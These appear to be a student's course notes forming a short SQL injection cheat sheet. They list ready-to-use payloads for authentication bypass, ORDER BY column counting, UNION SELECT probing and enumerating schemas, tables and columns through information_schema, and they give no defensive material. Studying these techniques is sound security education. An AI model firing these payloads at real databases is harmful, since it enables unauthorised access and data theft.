# SC Topic 4 - SQL Injection

###### tags: #SC 

## Table of Contents
```toc
```
## SQL Injection Cheat Sheet
- Basic SQL Injection
```
1' or 1=1; -- -  
```
- ORDER BY Attack
```
1' order by 1; -- -
```
- UNION Attack
```
1' union select null; -- -
```
- `information_schema` Attacks (Use fillers to match number of columns in table)
```
1' union select 1,2,table_schema from information_schema.tables;-- - 
1' union select 1,table_name,table_schema from information_schema.tables; -- - 
1' union select 1,column_name,table_schema from information_schema.columns where table_name='tablename'; -- - 
```

```sql
'or '1'='1' or "='' and password = ''
```